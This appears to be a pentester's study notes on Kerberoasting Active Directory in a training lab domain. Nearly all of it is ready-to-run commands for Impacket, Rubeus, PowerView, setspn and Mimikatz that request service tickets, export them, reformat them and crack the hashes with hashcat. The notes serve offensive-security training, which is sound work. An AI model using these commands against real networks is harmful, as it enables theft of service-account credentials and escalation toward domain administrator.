Depending on your position in a network, this attack can be performed in multiple ways:
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- **From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.**

Several tools can be utilized to perform the attack:
- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

#### GetUserSPNs
View groups
```bash
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

```bash
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request -outputfile kerberoast.out
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev.tgs
```

```bash
hashcat -m 13100 kerberoast.out ~/rockyou.txt -O
```

#### Rubeus
View Kerberoastable account stats. 
```powershell
.\Rubeus.exe kerberoast /stats
```

> [!NOTE] Nore
>  If we see any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password 

Target a single user - **Adding `/tgtdeleg` will give us a RC4 ticket increasing cracking speeds (Doesn't work on Windows server 2019 and up)** 
```bash
.\Rubeus.exe kerberoast /tgtdeleg /user:sapservice /nowrap
```
Target admin accounts
```powershell
.\Rubeus.exe kerberoast /tgtdeleg /ldapfilter:'admincount=1' /nowrap
```
Check encryption type (`0`= `RC4` | `24`= `AES 128/256`) - **PowerView**
```powershell
Get-DomainUser sapservice -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
Crack
```bash
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```
#### PowerVIew
Extract TGS tickets
```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname,serviceprincipalname
```
Target a specific user
```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
Export tickets to a .csv
```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
type .\ilfreight_tgs.csv
```
#### Manual Kerberoasting (Windows)
Enumerate SPNs - **ignore the computer accounts**
```powershell
setspn.exe -Q */*
```
Target a single user
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
Target all SPNs (users **and** computers)
```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
Extract with mimikatz
```bash
base64 /out:true
kerberos::list /export  
```

> [!NOTE] Note
> If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.

Prepare base64 blob for cracking
```bash
echo "<base64 blob>" |  tr -d \\n 
cat encoded_file | base64 -d > sqldev.kirbi
```
Extract Kerberos ticket and modify for hashcat
```shell
kirbi2john sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
Crack
```bash
hashcat -m 13100 sqldev_tgs_hashcat ~/rockyou.txt -O
```